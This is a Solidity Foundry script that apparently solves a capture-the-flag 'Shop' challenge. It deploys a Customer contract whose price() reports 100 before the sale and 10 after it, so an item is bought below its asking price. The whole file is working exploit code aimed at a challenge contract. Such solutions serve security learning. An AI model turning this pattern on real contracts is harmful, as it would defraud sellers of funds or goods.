// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script, console} from "../lib/forge-std/src/Script.sol";
import {Shop, Buyer} from "../src/Shop.sol";

contract ShopScript is Script {
    Customer public customer;

    function run() external {
        vm.startBroadcast();
        customer = new Customer();
        customer.buyFromShop();
        vm.stopBroadcast();
    }
}

contract Customer is Buyer {
    Shop public shop;

    constructor() {
        shop = Shop(0xE13d63257F12F8fD7BeA288833Cb4F6B4bcabd8b);
    }

    function buyFromShop() public {
        shop.buy();
    }

    function price() external view returns (uint256) {
        if (shop.isSold()) {
            return 10;
        }

        return 100;
    }
}
